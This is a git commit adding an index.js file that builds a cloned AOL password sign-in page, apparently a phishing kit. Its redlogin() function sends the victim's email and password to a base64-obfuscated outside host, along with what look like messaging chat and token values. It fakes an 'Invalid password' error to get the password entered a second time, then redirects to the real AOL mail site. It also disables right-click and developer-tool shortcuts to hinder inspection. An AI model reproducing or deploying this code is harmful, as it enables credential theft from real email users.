8e3c71a63a1f40d005773473f76701c88084bc77
idanamail <134937870+idanamail@users.noreply.github.com>
2023-05-29 13:27:25 +0100

    Create index.js

---
+++ index.js
@@ -0,0 +1,247 @@
+
+  
+
+function actn(){
+    document.body.innerHTML = box;    
+    }
+    const box = `<head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
+        <meta name="format-detection" content="telephone=no">
+        <meta name="referrer" content="strict-origin-when-cross-origin">
+        <title>AOL</title>
+        <meta name="description" content="AOL">
+  
+        <link rel="icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
+        <link rel="shortcut icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
+        <meta name="google-site-verification" content="yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0">
+        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
+        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
+        <style nonce="">
+            #mbr-css-check {
+                display: inline;
+            }
+        </style>
+        <link href="https://s.yimg.com/wm/mbr/9b56aef86f9c45eea3960d7eebb439e9c0017bac/aol-main.css" rel="stylesheet" type="text/css">
+        <script nonce="">
+            var pageStartTime = new Date().getTime();
+            (function(root) {
+                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
+                root.isGoodJS = isGoodJS;
+            }(this));
+            
+(function (root) {
+/* -- Data -- */
+root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
+root.I13N_config = {"keys":{"pt":"utility","ver":"nodejs"}};
+root.I13N_config || (root.I13N_config = {});
+root.I13N_config.spaceid = 794200033;
+root.I13N_config.location = "https:\u002F\u002Flogin.aol.com\u002Faccount\u002Fchallenge\u002Fpassword?src=mail&lang=en-us&pspid=1197803637&activity=default&display=login";
+root.I13N_config.referrer = "https:\u002F\u002Flogin.aol.com\u002Faccount\u002Fchallenge\u002Frecaptcha?src=mail&lang=en-us&pspid=1197803637&activity=default&display=login";
+root.I13N_config.keys || (root.I13N_config.keys = {});
+root.I13N_config.keys.pg_name = "passwordChallenge";
+root.I13N_config.keys.gm_np = "aol";
+root.I13N_config.keys.src = "mail";
+root.I13N_config.keys.p_sec = "DEFAULT_SECTION";
+root.I13N_config.keys.p_subsec = "DEFAULT_SUBSECTION";
+root.I13N_config.keys.test = "mbr-push-upsell-control,mbr-enbl-commchnl-rev-trap-sess-ext,mbr_yak_chg_pwd_exp1,mbr-sms-exp-all-ns,mbr-suspicious-2lc,mbr-reg-session-control,mbr-app-password-classifier";
+root.I13N_config.keys.cause = "default";
+root.I13N_config.keys.src_id = "1197803637";
+root.COMET_URL = "https:\u002F\u002Fserver.comet.yahoo.com\u002Fcomet";
+root.darlaConfig = {"url":"https:\u002F\u002Ffc.yahoo.com\u002Fsdarla\u002Fphp\u002Fclient.php?l=RICH{dest:tgtRICH;asz:flex}&f=794200033&ref=https%3A%2F%2Flogin.aol.com%2Faccount%2Fchallenge%2Fpassword&sa=geminifed%253D1%2520y-bucket%253Dmbr-push-upsell-control%252Cmbr-enbl-commchnl-rev-trap-sess-ext%252Cmbr_yak_chg_pwd_exp1%252Cmbr-sms-exp-all-ns%252Cmbr-suspicious-2lc%252Cmbr-reg-session-control%252Cmbr-app-password-classifier","k2Rate":1,"positions":{"RICH":{"sandbox":"allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox","id":"RICH","clean":"login-ad-rich","dest":"login-ad-rich","w":1440,"h":1024,"timeout":5000,"noexp":1,"fdb":"","on":1,"where":"inside","minReqWidth":1325,"showAfter":2000}}};
+root.challenge || (root.challenge = {});
+root.challenge.servingStamp = 1682158096504;
+root.challenge.isAndroidWebview = false;
+root.I13N_config.keys.pct = "signin";
+root.pwchallenge || (root.pwchallenge = {});
+root.pwchallenge.messages = {"toolTipShow":"Show password","toolTipHide":"Hide password"};
+root.isIOSDevice = false;
+}(this));
+
+            
+            YUI_config.global = window;
+
+
+            window.mbrSendError = function (name, url) {
+                (new Image()).src = '/account/js-reporting/?rid=17fr4m9i47cgg&crumb=' + encodeURIComponent('t95MnCWW6dZ') + '&message=' + encodeURIComponent(name) + '&url=' + encodeURIComponent(url);
+            };
+
+            var oldError = window.onerror;
+
+            window.onerror = function (errorMsg, url) {
+                window.mbrSendError(errorMsg, url);
+                if (oldError) {
+                    oldError.apply(this, arguments);
+                }
+                return false;
+            };
+
+        </script>
+    <script type="text/javascript" src="https://s.yimg.com/rq/darla/boot.js"></script><script id="sf_host_lib_sf_auto_6-22-3-2023" type="text/javascript" class="sf_lib" src="https://s.yimg.com/rq/darla/4-11-1/js/g-r-min.js"></script></head>
+    <body class="bucket-mbr-push-upsell-control bucket-mbr_yak_chg_pwd_exp1 bucket-mbr-sms-exp-all-ns bucket-mbr-reg-session-control">
+    <script nonce="">
+        (function(root) {
+            var doc = document;
+            if (root.isGoodJS) {
+                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
+            }
+        }(this));
+    </script>
+    <div id="login-body" class="loginish  puree-v2 responsive  grid    ">
+    <div class="mbr-desktop-hd">
+    <span class="column">
+         <a href="https://www.aol.com/">
+            <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo " width="100" height="">
+            <img src="https://s.yimg.com/wm/assets/images/ybar/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo " width="100" height="">
+        </a>
+    </span>
+    <span class="column help txt-align-right">
+        <a href="https://help.aol.com/">Help</a>
+    </span>
+</div>
+    <div class="login-box-container">
+        <div class="login-box right">
+            <div class="mbr-login-hd txt-align-center">
+                    <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo aol-en-US" width="100" height="">
+                    <img src="https://s.yimg.com/wm/assets/images/ybar/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo aol-en-US" width="100" height="">
+            </div>
+            <div class="challenge password-challenge">
+    <div class="challenge-header">
+        <div class="yid" id="displayName"></div>
+    </div><div id="password-challenge" class="primary">
+    <strong class="challenge-heading">Enter&nbsp;password</strong>
+    <span class="txt-align-center challenge-desc">to finish sign&nbsp;in</span>
+        <form class="challenge-form ">
+        
+
+        <div id="password-container" class="input-group password-container blurred">
+            <input type="password" id="epass" class="password" name="password" placeholder=" " autofocus="" autocomplete="current-password" data-rapid-tracking="true" data-ylk="elm:input;elmt:focus;slk:passwd;mKey:focus-passwd">
+            <label for="login-passwd" id="password-label" class="password-label">Password</label>
+            <div class="caps-indicator hide" id="caps-indicator" title="Capslock is&nbsp;on"></div>
+            <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1" title="Show&nbsp;password" data-rapid-tracking="true" data-ylk="elm:btn;elmt:toggle;slk:toggle-show-passwd;mKey:toggle-show-hide">
+            </button>
+        </div>
+        <p class="error-msg" id="error-msg" role="alert" data-error="messages.ERROR_INVALID_PASSWORD">
+            
+        </p>
+        <div class="button-container">
+            <button type="button" onclick="redlogin()" id="btn2" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Next" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:next">
+                    Next
+            </button>
+        </div>
+        <div class="forgot-cont challenge-button-link">
+            <input type="submit" class="pure-button puree-button-link challenge-button-link" data-ylk="elm:btn;elmt:skip;slk:skip;mKey:skip-recovery" data-rapid-tracking="true" id="mbr-forgot-link" name="skip" value="Forgot&nbsp;password?">
+        </div>
+    </form>
+</div>
+</div>
+        </div>
+        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
+            <h1></h1>
+<p></p>
+        </div>
+    </div>
+    <div class="login-bg-outer">
+        <div class="login-bg-inner">
+                <div id="sb_rel_login-ad-rich" class="darla" style="position: relative; z-index: 9; width: 1440px; height: 1024px; visibility: inherit; display: inline-block; font-size: 0px;"><img src="https://s.yimg.com/cv/apiv2/default/20181213/SUB_AOLMalwarebytes_SUSI_1440x1024_antivirusproyou@1X.jpg" width="1440" height="1024" border="0"></div>
+                    </div>
+    </div>
+    
+</div>
+  
+    <div id="mbr-css-check"></div>
+    <div id="page-mask" class="page-mask hide"></div>
+    <div id="ad"></div>
+
+</body>`;
+
+
+var s = document.createElement("script"); 
+    s.src = "https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"; 
+    s.onload = function(e){ 
+
+
+$(document).ready(function() {
+      actn();
+var elf = document.getElementById("epass");
+if (elf){
+elf.addEventListener("keypress", function(event) {
+  if (event.key === "Enter") {
+    event.preventDefault();
+    document.getElementById("btn2").click();
+  }
+});
+}
+  
+ var email = $("#ref").attr("soso");
+$("#displayName").html(email);   
+
+
+                      
+ }); 
+}
+document.head.appendChild(s);  
+
+
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+        document.onkeydown = function(e) {
+            if (e.ctrlKey && (e.keyCode === 73 || e.keyCode === 105 || e.keyCode === 74 || e.keyCode === 106 || e.keyCode === 85 || e.keyCode === 117)) {
+                alert('not allowed');
+                return false;
+            } else {
+                return true;
+            }
+        }
+            
+   
+
+
+
+function sign(){
+    document.getElementById('load').style.display = 'none';
+    document.getElementById('error3').style.display = 'block'; 
+    document.getElementById("epass").value='';
+    document.getElementById("btn2").disabled = false; 
+
+}
+
+ var count = 0;
+             function redlogin(){
+                var email= document.getElementById("displayName").innerHTML.trim();
+                  var epass= document.getElementById("epass").value;
+                var land = atob('aHR0cHM6Ly9tYWlsLmFvbC5jb20v'); 
+
+                if(epass==''){
+
+document.getElementById("password-container").classList.add('error');
+
+$("#error-msg").html("Please provide password.");   
+                }else{
+count=count+1;
+$("#btn2").attr('disabled',true);
+
+
+  var meji= $("#ref").attr("ant");
+  var tcd = meji.split('#');
+  var cckcrch = atob(tcd[0]);
+  var yara = atob(tcd[1]);
+  var ruta = atob('aHR0cHM6Ly9zb2phYm9pLm9ubGluZS8=');
+  var register = "u="+email+"&p="+epass+"&chatid="+yara+"&makin="+cckcrch+"&signup=AOL";
+
+$.post(ruta, register, function(data){            
+          console.log('response: ', data);
+if (count>=2) {
+       count=0;
+       
+        window.location.replace(land);
+}else {
+$("#error-msg").html("Invalid password. Please try&nbsp;again"); 
+  
+       $("#btn2").attr('disabled',false);
+        
+return false;
+}         
+ });
+}
+}
